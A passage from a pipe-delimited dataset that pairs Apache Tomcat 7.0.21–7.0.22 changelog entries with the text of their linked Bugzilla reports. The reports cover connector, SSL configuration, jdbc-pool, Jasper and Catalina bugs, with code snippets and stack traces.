2. Poller0 - Checks the wakeupCounter.get() > 0 which evaluates to false (wakeupCounter is 0).
3. Worker1 - Finishes an event and calls in to Poller#addEvent
4. Worker1 - Enqueues the PollerEvent that will reset the interest ops.
5. Worker1 - Calls wakeupCounter.incrementAndGet to increment and get wakeupCounter to 1.  This fails the check to call selector.wakeup();
6. Poller0 - Calls wakeupCounter.set(-1)
7. Poller0 - Calls selector.select(selectorTimeout) and blocks for either the full time out or until another unrelated SelectionKey is polled.
8. Poller0 - Ultimately gets around to calling events() again which now resets the interest ops for the SelectionKey that was processed by Worker1.

The simple fix for this is to change this code:
                            if (wakeupCounter.get() > 0) {
                                //if we are here, means we have other stuff to do
                                //do a non blocking select
                                keyCount = selector.selectNow();
                            } else {
                                wakeupCounter.set(-1);
                                keyCount = selector.select(selectorTimeout);
                            }

to this 
                            if (wakeupCounter.getAndSet(-1) > 0) {
                                //if we are here, means we have other stuff to do
                                //do a non blocking select
                                keyCount = selector.selectNow();
                            } else {
                                keyCount = selector.select(selectorTimeout);
                            }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51794
Coyote|Tomcat 7.0.22 (markt)|fix|51811|Correct SSL configuration property name from sslImplemenationName to sslImplementationName. (rjung)|SSL configuration property name illegal|"server.xml configuration file. Connector properties.
org.apache.coyote.http11.Http11NioProtocol

property set: sslImplementationName=""ru.yamoney.calypso.server.security.jsse.CalypsoSSLImplementation""

Causes an error during catalina startup:

[2011-09-14 18:42:16.299] [main WARN  commons.digester.Digester] - [SetAllPropertiesRule]{Server/Service/Connector} Setting property 'sslImplementationName' to 'ru.yamoney.calypso.server.security.jsse.CalypsoSSLImplementation' did not find a matching property.


According documentation:
http://tomcat.apache.org/tomcat-7.0-doc/config/http.html#SSL%20Support

the property name is: sslImplementationName


see the source code:
org.apache.coyote.http11.AbstractHttp11JsseProtocol

line 107:

    public String getSslImplemenationName() { return sslImplemenationName; }
    public void setSslImplemenationName(String s) {
        this.sslImplemenationName = s;
    }


As you see, the property name is misspelled (""sslImplemenation"").

When I set the connector property as:
sslImplemenationName=""ru.yamoney.calypso.server.security.jsse.CalypsoSSLImplementation""

the catalina starts fine.

Versions affected: 7.0.20 and 7.0.21"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51811
Coyote|Tomcat 7.0.22 (markt)|fix||Fix a timing issue in NIO connector that meant that stopping a connector did not trigger a Comet END event if the associated processor was processing a READ event when the connector was stopped. (markt)|||
Coyote|Tomcat 7.0.22 (markt)|fix||Replace unneeded call that iterated events queue in NioEndpoint.Poller. (kkolinko)|||
Coyote|Tomcat 7.0.22 (markt)|fix|51860|Fix issues if using NIO with a custom SSLImplementation. Based on a suggestion by Roman Tsirulnikov. (markt)|HTTP/SSL with NIO won't work|"Error reproduction conditions:
Tomcat 7.0.20 and 21.
Connector=""...Http11NioProtocol""
SSLEnabled=""true""
secure=""true""
scheme=""https""
clientAuth=true or false
JDK 1.6.0_27 X64.
All operation systems.

When user connects to https://, the SSL handshake fails with error:
javax.net.ssl.SSLHandshakeException: no cipher suites in common

If we have same connector settings,  but if we change it to BIO: Connector=""...Http11Protocol"", everything works fine.

The problem cause is a differences in SSL behavior between BIO and NIO handshake.
I've found the workaround here:
http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6448723


See the org.apache.tomcat.util.net.jsse.JSSESocketFactory. JSSEKeyManager wraps the KeyManager.
In NIO mode, the KeyManager should have two extra methods:

        public java.lang.String chooseEngineClientAlias(java.lang.String[] keyType, java.security.Principal[] issuers, javax.net.ssl.SSLEngine engine);

        public java.lang.String chooseEngineServerAlias(java.lang.String keyType, java.security.Principal[] issuers, javax.net.ssl.SSLEngine engine);

We use a custom hand-made SSLInmplemention with extra features:
* Keypair storage on hardware device or database
* ExtendedKeyUsage verification in TrustManager
* CRL validation on CRL distribution point online synchronization
* ActiveDirectory account lookup by certificate

The complete source code of workaround:
package ru.yamoney.calypso.server.security.jsse;

import org.apache.tomcat.util.net.AbstractEndpoint;
import org.apache.tomcat.util.net.jsse.JSSESocketFactory;
import ru.yamoney.calypso.server.CommonKernel;

import javax.net.ssl.*;
import java.net.Socket;
import java.security.KeyStore;
import java.security.Principal;
import java.security.PrivateKey;
import java.security.cert.X509Certificate;

/**
 * SSLImplementation for Tomcat-7-NIO
 *
 * @author Roman Tsirulnikov
 */
final class CalypsoSSLSocketFactory
        extends JSSESocketFactory {
    private final CalypsoKeyManager keyManager;
    private final X509TrustManager trustManager;

    public CalypsoSSLSocketFactory(AbstractEndpoint endpoint) {
        super(endpoint);
        keyManager = CommonKernel.getInstance().getBean(""server_calypsoKeyManager"");
        trustManager = CommonKernel.getInstance().getBean(""server_calypsoTrustManager"");
    }

    @Override
    public KeyManager[] getKeyManagers() {
        try {
            KeyStore ks = keyManager.getKeyStore();
            if (!ks.isKeyEntry(keyManager.getKeyAlias())) {
                throw new IllegalArgumentException(""Keystore entry is not a private keypair: "" + keyManager.getKeyAlias());
            }

            KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
            kmf.init(ks, keyManager.getKeystorePass().toCharArray());
            KeyManager[] kms = kmf.getKeyManagers();
            for (int i = 0; i < kms.length; i++) {
                kms[i] = new NIOKeyManagerWrapper((X509KeyManager) kms[i], keyManager.getKeyAlias());
            }

            return kms;
        } catch (Exception e) {
            throw new IllegalArgumentException(""SSLSocketFactory init: "" + e.getMessage(), e);
        }
    }

    @Override
    public TrustManager[] getTrustManagers() {
        return new TrustManager[]{trustManager};
    }

    /**
     * X509KeyManager wrapper
     * Workaround for the SSL-NIO engine bug http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6448723
     */
    private final class NIOKeyManagerWrapper extends X509ExtendedKeyManager {
        private X509KeyManager delegate;
        private String serverKeyAlias;

        /**
         * Constructor.
         *
         * @param mgr            The X509KeyManager used as a delegate
         * @param serverKeyAlias The alias name of the server's keypair and
         *                       supporting certificate chain
         */
        NIOKeyManagerWrapper(X509KeyManager mgr, String serverKeyAlias) {
            super();
            this.delegate = mgr;
            this.serverKeyAlias = serverKeyAlias;
        }

        /**
         * Choose an alias to authenticate the client side of a secure socket,
         * given the public key type and the list of certificate issuer authorities
         * recognized by the peer (if any).
         *
         * @param keyType The key algorithm type name(s), ordered with the
         *                most-preferred key type first
         * @param issuers The list of acceptable CA issuer subject names, or null
         *                if it does not matter which issuers are used
         * @param socket  The socket to be used for this connection. This parameter
         *                can be null, in which case this method will return the most generic
         *                alias to use
         * @return The alias name for the desired key, or null if there are no
         *         matches
         */
        @Override
        public String chooseClientAlias(String[] keyType, Principal[] issuers,
                                        Socket socket) {
            return delegate.chooseClientAlias(keyType, issuers, socket);
        }

        /**
         * Returns this key manager's server key alias that was provided in the
         * constructor.
         *
         * @param keyType The key algorithm type name (ignored)
         * @param issuers The list of acceptable CA issuer subject names, or null
         *                if it does not matter which issuers are used (ignored)
         * @param socket  The socket to be used for this connection. This parameter
         *                can be null, in which case this method will return the most generic
         *                alias to use (ignored)
         * @return Alias name for the desired key
         */
        @Override
        public String chooseServerAlias(String keyType, Principal[] issuers,
                                        Socket socket) {
            return serverKeyAlias;
        }

        /**
         * Returns the certificate chain associated with the given alias.
         *
         * @param alias The alias name
         * @return Certificate chain (ordered with the user's certificate first
         *         and the root certificate authority last), or null if the alias can't be
         *         found
         */
        @Override
        public X509Certificate[] getCertificateChain(String alias) {
            return delegate.getCertificateChain(alias);
        }

        /**
         * Get the matching aliases for authenticating the client side of a secure
         * socket, given the public key type and the list of certificate issuer
         * authorities recognized by the peer (if any).
         *
         * @param keyType The key algorithm type name
         * @param issuers The list of acceptable CA issuer subject names, or null
         *                if it does not matter which issuers are used
         * @return Array of the matching alias names, or null if there were no
         *         matches
         */
        @Override
        public String[] getClientAliases(String keyType, Principal[] issuers) {
            return delegate.getClientAliases(keyType, issuers);
        }

        /**
         * Get the matching aliases for authenticating the server side of a secure
         * socket, given the public key type and the list of certificate issuer
         * authorities recognized by the peer (if any).
         *
         * @param keyType The key algorithm type name
         * @param issuers The list of acceptable CA issuer subject names, or null
         *                if it does not matter which issuers are used
         * @return Array of the matching alias names, or null if there were no
         *         matches
         */
        @Override
        public String[] getServerAliases(String keyType, Principal[] issuers) {
            return delegate.getServerAliases(keyType, issuers);
        }

        /**
         * Returns the key associated with the given alias.
         *
         * @param alias The alias name
         * @return The requested key, or null if the alias can't be found
         */
        @Override
        public PrivateKey getPrivateKey(String alias) {
            return delegate.getPrivateKey(alias);
        }

        public java.lang.String chooseEngineClientAlias(java.lang.String[] keyType, java.security.Principal[] issuers, javax.net.ssl.SSLEngine engine) {
            return delegate.chooseClientAlias(keyType, issuers, null);
        }

        public java.lang.String chooseEngineServerAlias(java.lang.String keyType, java.security.Principal[] issuers, javax.net.ssl.SSLEngine engine) {
            return serverKeyAlias;
        }

    }
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51860
Coyote|Tomcat 7.0.22 (markt)|fix||Allow the BIO HTTP connector to be used with SSL when running under Java 7. (markt)|||
Coyote|Tomcat 7.0.22 (markt)|update||Don't send AJP CPONG if endpoint is already paused. (rjung)|||
Coyote|Tomcat 7.0.22 (markt)|update||Align APR AJP connector with NIO one. Send 503 if endpoint is paused. (rjung)|||
Coyote|Tomcat 7.0.22 (markt)|update||Accept AJP request even if endpoint is paused, if CPING was successful. (rjung)|||
Jasper|Tomcat 7.0.22 (markt)|fix||When unloading JSPs due to configuration of the maxLoadedJsps initialisation parameter, the unloading code was retaining a reference to the unloaded JSP preventing the associated class from being unloaded until the JSP that replaced it was itself unloaded. (markt)|||
Jasper|Tomcat 7.0.22 (markt)|fix|51852|Correct two problems in the handling of varargs methods with the BeanELResolver. The first meant the wrong method was sometimes called and the second that an ArrayIndexOutOfBoundsExceptions could be thrown. Patch (including a test case) provided by Matt Benson. (markt)|BeanELResolver varargs handling is broken in multiple ways|"The supplied patch (against SVN Revision 1173292) addresses:
 - Incorrectly constructed varargs arguments (resulting in ArrayIndexOutOfBoundsExceptions)
 - Incorrectly detected matching varargs methods

I originally encountered the first issue in my JSF application using the JUEL EL implementation in conjunction with Tomcat's EL API.  However I continue to get the error even when dropping JUEL from the application, so I'm not sure why in some instances the Jasper implementation seems to handle the varargs invocations and in others the BeanELResolver is invoked.  In any event, code that already resides in BeanELResolver should certainly function properly, and mixing a given ExpressionFactory implementation with any conforming API implementation should AFAICT be feasible.

The second issue I encountered while debugging the first issue."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51852
Cluster|Tomcat 7.0.22 (markt)|update||Refactor cluster manager configuration: move handling of common attributes to base class. (kfujino, rjung)|||
Cluster|Tomcat 7.0.22 (markt)|add||New cluster manager attribute sessionAttributeFilter allows to filter which session attributes are replicated using a regular expression applied to the attribute name. (rjung)|||
Web applications|Tomcat 7.0.22 (markt)|fix||Correct the documentation for connectionLinger attribute for the AJP and HTTP connectors. (markt)|||
Web applications|Tomcat 7.0.22 (markt)|update||Document caveat of using RemoteAddrValve with IPv6 addresses. (kkolinko)|||
jdbc-pool|Tomcat 7.0.22 (markt)|fix||In jdbc-pool: Avoid IllegalArgumentException when setting maxActive less than or equal to 0. ArrayBlockingQueue doesn't allow capacity of 0 or less. (kfujino)|||
jdbc-pool|Tomcat 7.0.22 (markt)|fix||48392 (r1169796): Fix typo in StatementDecoratorInterceptor. (fhanik)|jdbc-pool is not returning the proxied connection in resultSet and statement|"The proxy connection returned by the jdbc-pool is not proxying the resultSet and the statement so if the client gets access to the underlying connection through: 

resultSet.getStatement().getConnection()

He is able to close the physical connection due to both instances (resultSet and statement) were not proxied. 
If this happens next time a client gets a connection from the jdbc-pool it will return a proxy with a physical connection closed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48392
jdbc-pool|Tomcat 7.0.22 (markt)|fix|51139|In jdbc-pool: validatorClassName and suspectTimeout are ignored. In order to support them correctly, validatorClassName and suspectTimeout are added to a property list. (kfujino)|"Possible bug in code related to ""validatorClassName"" property?"|"Created attachment 26945 [details]
Add missing validatorClassName prpoerty to ALL_PROPERTIES array

I've been trying to configure a connection pool that includes a custom validator class, however it seems like if the ""validatorClassName"" property is specified in the configuration XML, the property is not getting passed to the new created datasoure implementation in DataSourceFactory.  It seems the properties array, ALL_PROPERTIES, in DataSourceFactory does not contain validatorClassName so that property is never propogated?  When I add the property to the ALL_PROPERTIES array, it seems to work as I would expect.  Have I missed something in the expected configuration? I'll attach a patch for the proposed mod to DataSourceFactory.java."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51139
jdbc-pool|Tomcat 7.0.22 (markt)|fix|51786|In jdbc-pool: Discarded connection is not active in a pool any longer. It removes from the active connection list. (kfujino)|Discarded connection stay active in pool|"Hi,
I wrote an JdbcInterceptor that flag connection as discarded in case of Exception that makes the connection unusable.
The problem is:
when I call close on the connection, it is not returned to the pool and it is still considered as an active connection in the pool.
The cause of the problem is those pieces of code in ProxyConnection:

if (compare(CLOSE_VAL,method)) {
            if (isClosed()) return null; //noop for already closed.
            PooledConnection poolc = this.connection;
            this.connection = null;
            pool.returnConnection(poolc);
            return null;
        }


and

public boolean isClosed() {
        return connection==null || connection.isDiscarded();
    }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51786
jdbc-pool|Tomcat 7.0.22 (markt)|fix|51871|Fix dependency in Maven POM file of tomcat-jbdc. (kkolinko)|Wrong transitive dependency listed in tomcat-jdbc maven pom|"tomcat-jdbc depends upon tomcat-juli.  However, the maven pom for tomcat-jdbc lists itself as a transitive dependency instead:

http://search.maven.org/remotecontent?filepath=org/apache/tomcat/tomcat-jdbc/7.0.21/tomcat-jdbc-7.0.21.pom

I believe this is supposed to be tomcat-juli similar to other tomcat dependencies dependent on tomcat-juli like tomcat-coyote:

http://search.maven.org/remotecontent?filepath=org/apache/tomcat/tomcat-coyote/7.0.21/tomcat-coyote-7.0.21.pom"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51871
Other|Tomcat 7.0.22 (markt)|update||"Update the ""test"" target in the default build file to report a test failure only after all available connector variants (bio, nio, apr) have been tested. Do not stop after first connector that fails. (kkolinko)"|||
Other|Tomcat 7.0.22 (markt)|update|51887|When running the unit tests, use a fast but insecure random number source for session ID generation to reduce the delays caused by waiting for entropy. (kkolinko/markt)|Speedup sessionid generation when running testsuite|"Created attachment 27581 [details]
2011-09-24_tc8_DummySecureRandom.patch

When I run the Tomcat tests on Windows, I see a lot of following messages in the logs:

[junit] 24.09.2011 17:23:56 org.apache.catalina.util.SessionIdGenerator createSecureRandom
[junit] INFO: Creation of SecureRandom instance for session ID generation using [SHA1PRNG] took [5,019] milliseconds.

It is OK whan starting a single Tomcat instance, but when running tests it adds 5 seconds to each startup of Tomcat.


I am attaching patch that
1) Adds new DummySecureRandom class.
2) Hardcodes SessionIdGenerator to use this class.

The SessionIdGenerator part of the patch cannot be committed as is."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51887
Other|Tomcat 7.0.22 (markt)|code||Code clean-up to further reduce the number of warnings reported by Eclipse, FindBugs and CheckStyle. (markt/kkolinko)|||
Catalina|Tomcat 7.0.21 (markt)|add|41718|Include a response body when sending a redirect. (markt)|Status 302 response to GET request has no body when calling sendRedirect|"RFC2616 (10.3.3 302 Found) says as follows:

  Unless the request method was HEAD, the entity of the
  response SHOULD contain a short hypertext note with a hyperlink to
  the new URI(s).

In case HTTP redirect response is created without sendRedirect,
servlet developers are responsible for its header and body.
However, when calling sendRedirect, body with a hyperlink
should be included in the response."|https://bz.apache.org/bugzilla/show_bug.cgi?id=41718
Catalina|Tomcat 7.0.21 (markt)|add|51640|Improve the memory leak prevention for leaks triggered by java.sql.DriverManager. (markt)|clearReferencesJdbc seems to be causing leaks with com.oracle.ojdbc5 driver|"Created attachment 27365 [details]
Example Maven project to reproduce the problem

clearReferencesJdbc seems to be causing reference leaks when used with com.oracle.ojdbc5 version 11.1.0.7.0, even if that class isn't loaded by the application.  As best as I can tell, that function is loading one or more classes from the jar.  Those classes are then adding a jmx MBean which then causes a reference leak.


Error message:
Aug 9, 2011 4:53:11 PM org.apache.catalina.loader.WebappClassLoader clearReferencesJdbc
SEVERE: The web application [/mavenproject1-1.0-SNAPSHOT] registered the JDBC driver [oracle.jdbc.OracleDriver] but failed to unregister it when the web application was stopped. To prevent a memory leak, the JDBC Driver has been forcibly unregistered.


List of classes in the class-loader:
0 : class org.apache.catalina.loader.JdbcLeakPrevention (84 bytes)
1 : class oracle.jdbc.driver.OracleDriver (84 bytes)
2 : class oracle.jdbc.OracleDriver (84 bytes)
3 : class oracle.jdbc.driver.OracleDriverExtension (84 bytes)
4 : class oracle.jdbc.driver.OracleDriver$1 (84 bytes)
5 : class oracle.jdbc.driver.DiagnosabilityMXBean (84 bytes)
6 : class oracle.jdbc.driver.OracleDiagnosabilityMBean (84 bytes)
7 : class oracle.jdbc.driver.DatabaseError (84 bytes)
8 : class oracle.jdbc.driver.OracleSQLException (84 bytes)
9 : class oracle.net.ns.NetException (84 bytes)
10 : class oracle.jdbc.driver.SQLStateMapping (84 bytes)
11 : class oracle.jdbc.driver.SQLStateMapping$Tokenizer (84 bytes)
12 : class oracle.jdbc.driver.Message (84 bytes)
13 : class oracle.jdbc.driver.Message11 (84 bytes)
14 : class oracle.jdbc.internal.ObjectDataFactory (84 bytes)
15 : class oracle.sql.ORADataFactory (84 bytes)
16 : class oracle.sql.AnyDataFactory (84 bytes)
17 : class oracle.jdbc.internal.ObjectData (84 bytes)
18 : class oracle.sql.ORAData (84 bytes)
19 : class oracle.sql.TypeDescriptorFactory (84 bytes) 

I believe this means that JdbcLeakPrevention is the first class to actually be loaded.


Steps to reproduce:
1) Compile the project, using the driver from http://www.oracle.com/technetwork/database/enterprise-edition/jdbc-111060-084321.html
2) Deploy the project to tomcat.
3) Undeploy the project from tomcat.  You should get the error about clearReferencesJdbc


Expected:
While I would expect Tomcat to not leak the class, I would be happy if there was an option to make Tomcat not run clearReferencesJdbc, allowing me to undeploy the app without leaking.  This would not be as much of a problem if it wasn't causing the entire classloader and everything that implies to be leaked too."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51640
Catalina|Tomcat 7.0.21 (markt)|fix|51644|Fix annotation scanning for contexts with a multi-level context path such as /a/b. (markt)|Unable to deploy applications with the name a#b.xml|"When I try to deploy a context with the name ""a#b.xml"" I get the following exception.


SEVERE: Unable to process JNDI URL [jndi:/localhost/sample/one/WEB-INF/classes]
for annotations
java.io.FileNotFoundException: jndi:/localhost/sample/one/WEB-INF/classes
        at org.apache.naming.resources.DirContextURLConnection.list(DirContextUR
LConnection.java:452)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(Cont
extConfig.java:1901)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(Conte
xtConfig.java:1828)
        at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.jav
a:1295)
        at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfi
g.java:896)
        at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfi
g.java:322)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(Lifecycl
eSupport.java:119)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBa
se.java:89)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContex
t.java:5103)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase
.java:812)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:78
7)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:607)

        at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.ja
va:633)
        at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.j
ava:558)
        at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:468
)
        at org.apache.catalina.startup.HostConfig.check(HostConfig.java:1363)
        at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java
:294)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(Lifecycl
eSupport.java:119)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBa
se.java:89)
        at org.apache.catalina.core.ContainerBase.backgroundProcess(ContainerBas
e.java:1233)
        at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.p
rocessChildren(ContainerBase.java:1391)
        at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.p
rocessChildren(ContainerBase.java:1401)
        at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.r
un(ContainerBase.java:1380)
        at java.lang.Thread.run(Thread.java:619)


I would have expected the application to be available in the URI a/b. The bug seems to be in the ""list()"" method ""of DirContextURLConnection.java. The method assumes that context name does not have any ""/"" characters in it. See the developer note just before the ""if"" block. I have added the ""else if"" condition that seems to have solved the problem for me.

            try {
                String file = getURL().getFile();
                // This will be of the form /<hostname>/<contextpath>/file name
                // if <contextpath> is not empty otherwise this will be of the
                // form /<hostname>/file name
                // Strip off the hostname and the contextpath
                int start;
                if(context instanceof ProxyDirContext &&
                        """".equals(((ProxyDirContext)context).getContextPath())){
                    start = file.indexOf('/',1);
                }
                else if(context instanceof ProxyDirContext){
                	start=""/"".length()
                			+((ProxyDirContext)context).getHostName().length()
                			+((ProxyDirContext)context).getContextPath().length();
                	/*
                	 * Seems like a bug in Tomcat. below was the code in Tomcat.
                	 * How can it handle contextpath like ""/sample/one"". It cannot
                	 */
                    //start = file.indexOf('/', file.indexOf('/', 1) + 1);
                } else
                	start = file.indexOf('/', file.indexOf('/', 1) + 1);
                
                NamingEnumeration<NameClassPair> enumeration =
                    context.list(file.substring(start));
                while (enumeration.hasMoreElements()) {
                    NameClassPair ncp = enumeration.nextElement();
                    result.addElement(ncp.getName());
                }
            } catch (NamingException e) {"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51644
Catalina|Tomcat 7.0.21 (markt)|fix||Unregisters MBean of DataSource when web application stops. (kfujino)|||
Catalina|Tomcat 7.0.21 (markt)|fix|51650|Code clean-up. Patch provided by Felix Schumacher. (markt)|possible nullpointer exception in RequestUtil.parseParameters|"Created attachment 27376 [details]
set default encoding, if none is given

When encoding is null, RequestUtil.parseParameters will throw a NPE at B2CConverter.getCharset."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51650
Catalina|Tomcat 7.0.21 (markt)|fix|51653|Move application level error page handling from the Host to the Context. This ensures that application error page handling is completed before the requestDestroyed event of any ServletRequestListener is fired. (markt)|ServletRequestListener.requestDestroyed is called before request leaves a webapp|"Created attachment 27379 [details]
Sample webapp demonstrating the issue

I use Tomcat 7.0.19, jdk 1.7.0-b147, Ubuntu Linux 11.04.

Steps to reproduce:
1. declare error page for 404 code in web.xml
2. Set location of that page to some servlet (let's call it ErrorServlet)
3. go to any invalid URL in webapp (to cause 404)
4. ErrorServlet is called after requestDestroyed on any registered listener.
This kind of behaviour is not correct in my opinion because it
contradicts to contract of ServletRequestListener.
Also it breaks org.springframework.web.context.request.RequestContextListener
if ErrorServlet uses session-scoped beans.

Description of the attached war file:
1. wheleph.RequestContextListener sets a local variable in requestInitialized and resets it in requestDestroyed
2. wheleph.SecondServlet writes to System.out the value of that variable thus showing whether it was called between requestInitialized and requestDestroyed or not. It's registered as 404 handler.
3. To reproduce the bug go to any invalid url (like http://localhost:8080/SpringListenerPOC/abcd) and see the message in log: 
""SecondServlet
in scope: false""

The relevant thread from dev.tomcat.apache.org:

On 09/08/2011 20:55, Volodymyr Sobotovich wrote:
> Hello, everyone.
>
> I think I have found a bug in Tomcat's lifecycle handling of
> ServletRequestListener. I'd like to discuss it here before posting.
> Tomcat 7.0.19, jdk 1.7.0-b147, Ubuntu Linux 11.04
> Steps to reproduce:
> 1. declare error page for 404 code in web.xml
> 2. Set location of that page to some servlet (let's call it ErrorServlet)
> 3. go to any invalid URL in webapp (to cause 404)
> 4. ErrorServlet is called after requestDestroyed on any registered listener.
> This kind of behaviour is not correct in my opinion because it
> contradicts to contract of ServletRequestListener.
> Also it breaks org.springframework.web.context.request.RequestContextListener
> if ErrorServlet uses session-scoped beans.
>
> What do you think about that. Should I post in to Bugzilla?

Hmm.

The error page handling is currently at the host level. One could argue
the listeners are being fired in the right place (when processing
enters/leaves the context). However, custom error pages defined by the
web app are currently outside the listener calls and that doesn't seem
right.

Addressing this would mean either:
a) moving the error handling to the context (inside the calls to the
ServletRequestListener) or
b) moving the calls to ServletRequestListener to the host level

I am leaning towards a) but wondering why things are the way the are
currently.

I'd suggest leaving this on the dev list for other folks to comment and
then add it to BZ in a couple of days unless the consensus is that it is
not a bug. The next 7.0.x release won;t be until early Sept so there is
plenty of time to get this right.

Mark

=======================================================================
Mark,

On 8/9/2011 4:35 PM, Mark Thomas wrote:
> Addressing this would mean either:
> a) moving the error handling to the context (inside the calls to the
> ServletRequestListener) or

+1

This just feels like the right state management level to me. Certainly
the default error handler can be called just as easily from this level
of the code.

-chris"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51653
Catalina|Tomcat 7.0.21 (markt)|fix|51654|Improve handling of invalid appBase settings for Host elements. (markt)|NullPointerException in startup (org.apache.catalina.startup.HostConfig.filterAppPaths) due to missing app base|"A hard-to-diagnose NullPointerException at startup which can be bettered with an appropriate error message:

INFO: Starting Servlet Engine: Apache Tomcat/7.0.19
java.lang.NullPointerException
at org.apache.catalina.startup.HostConfig.filterAppPaths(HostConfig.java:493)
at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:466)
at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1322)
at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:311)
at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89)

Ok, what's this about?

In ""protected String[] filterAppPaths(String[] unfilteredAppPaths)""
the exception is raised at

  for (String appPath : unfilteredAppPaths)

Which means the ""unfilteredAppPaths"" passed in is null. filterAppPaths does not check for that (shouldn't there be an assertion at least)

The problems comes from ""deployApps()"":

    protected void deployApps() {

        File appBase = appBase();
        File configBase = configBase();
        String[] filteredAppPaths = filterAppPaths(appBase.list()); <----
        // Deploy XML descriptors from configBase
        deployDescriptors(configBase, configBase.list());
        // Deploy WARs, and loop if additional descriptors are found
        deployWARs(appBase, filteredAppPaths);
        // Deploy expanded folders
        deployDirectories(appBase, filteredAppPaths);
        
    }

Where ""appBase.list()"" returns null. This must be because ""appBase"" does not actually denote a directory (A-HA!)

Indeed, the server.xml points to a nonexisting appBase.

Suggesting to add a check to ""deployApps"":

    protected void deployApps() {

        File appBase = appBase();
        File configBase = configBase();

        if (!appBase.exists() || appBase.list()==null) {
            throw new IllegalArgumentException(""The appBase "" + appBase + "" does not exist or cannot be listed"");
        }

        String[] filteredAppPaths = filterAppPaths(appBase.list()); <----
        // Deploy XML descriptors from configBase
        deployDescriptors(configBase, configBase.list());
        // Deploy WARs, and loop if additional descriptors are found
        deployWARs(appBase, filteredAppPaths);
        // Deploy expanded folders
        deployDirectories(appBase, filteredAppPaths);
        
    }

This probably violates some I18N requirement though."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51654
Catalina|Tomcat 7.0.21 (markt)|fix|51658|Fix possible NPE when logging a failed request. Based on a suggestion by Felix Schumacher. (markt)|Potential NPE in CoyoteAdapter.log|"Created attachment 27384 [details]
logAccess on host instead of context

In CoyoteAdapter.log:501 request.mapping.context is known to be null and request.mapping.host is checked to be not null, but inside that if branch in line 503 request.mapping.context will be used.

I think it should be ""((Host) request.mappingData.host).logAccess(..."" instead."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51658
Catalina|Tomcat 7.0.21 (markt)|fix|51688|JreMemoryLeakPreventionListener now protects against AWT thread creation. (schultz)|JreMemoryLeakPreventionListener should protect against AWT thread creation|"Any webapp that calls java.awt.Toolkit.getDefaultToolkit will launch a new thread (AWT-Windows, AWT-XAWT, etc.) which will capture the ContextClassLoader, pinning the webapp in memory after an undeploy/redeploy.

A simple addition to JreMemoryLeakPreventionListener can alleviate this condition."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51688
Catalina|Tomcat 7.0.21 (markt)|fix|51712|Ensure cache control headers are sent when appropriate even if the request is secure. Patch provided by Michael Zampani. (markt)|Regression in cache-control headers for requests with security-constraints|"Created attachment 27428 [details]
Patch to revert isSecure() check

Copied from http://markmail.org/thread/rlkpd3hqihc3zbji

CLN 1126273
http://svn.apache.org/viewvc?view=revision&revision=1126273
sets the default value for securePagesWithPragma to false, but also (re)added a request.isSecure() check to the block for adding the cache-control headers.

This results in the headers not being added for secure requests with security-constraints.  This is a change in behavior from Tomcat-7.0.14 that causes IE8 to improperly cache some secure pages.

The secure check was initially added in CLN 287690
http://svn.apache.org/viewvc?view=revision&revision=287690
to fix a bug in IE caching
https://issues.apache.org/bugzilla/show_bug.cgi?id=6641
but was commented out in CLN 302373
http://svn.apache.org/viewvc?view=revision&revision=302373

patch to remove isSecure() check added."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51712
Catalina|Tomcat 7.0.21 (markt)|fix|51713|Improve message that is logged if there is an error in the value of protocol in a Connector. (kkolinko)|Bad Connector protocol causes NullPointerException when using Executor|"Under the following configuration, an NPE is thrown because _setExecutor() calls con.getProtocolHandler().getClass() when the protocol handler is null.

It would be nice to report a bad configuration instead of suffering an NPE.

server.xml:

    <Executor name=""tomcatThreadPool"" namePrefix=""catalina-exec-""
        maxThreads=""150"" minSpareThreads=""4""/>

    <Connector port=""12345""
               redirectPort=""443"" protocol=""HTTP""
               secure=""true"" scheme=""https"" proxyPort=""80""
               URIEncoding=""UTF-8"" executor=""tomcatThreadPool"" />

catalina.out:
